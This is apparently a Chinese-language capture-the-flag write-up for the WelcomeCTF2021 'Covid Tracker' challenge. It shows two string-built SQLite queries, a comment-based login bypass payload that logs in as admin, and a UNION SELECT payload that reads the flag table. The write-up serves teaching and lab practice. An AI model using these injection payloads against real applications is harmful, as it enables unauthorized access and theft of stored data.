# Covid Tracker

## 题目简述

WelcomeCTF2021 的 Covid Tracker 是一个 Node.js/SQLite 应用。登录接口与地点搜索接口都把用户输入直接拼入 SQL；登录成功后才能访问搜索接口，而 flag 位于地点数据库的独立 `flag(value)` 表中。

## 解题过程

登录查询为：

```javascript
`SELECT username FROM users WHERE username='${username}' AND password='${password}'`
```

服务不仅要求查询有结果，还要求返回的 `row.username` 等于 `admin`。因此用户名可提交带注释的管理员条件，例如：

```text
admin' -- -
```

拼接后，密码判断被注释，查询直接返回 `admin` 行，服务在 session 中设置 `loggedIn=true`。

地点搜索查询为：

```javascript
`SELECT name, geo, cases FROM locations WHERE name LIKE '%${search}%'`
```

原查询返回三列，所以使用三列 `UNION SELECT`，把 flag 值复制到可显示字段：

```sql
' UNION SELECT value, value, 0 FROM flag -- -
```

最终 SQL 的前半部分可以返回普通地点，`UNION` 的附加行则来自 `flag` 表。接口把结果序列化成 JSON，地图前端或直接查看响应均可读到：

```text
greyhats{w3bApp5_n33d_v@cc1ne?_4521f}
```

## 方法总结

这是一条两阶段 SQL 注入链：第一次注入建立已登录 session，第二次注入跨表读取 flag。登录阶段不能只用任意恒真式，还必须让首行用户名满足应用层的 `admin` 比较；联合查询阶段则要匹配原查询的三列数量和可兼容类型。
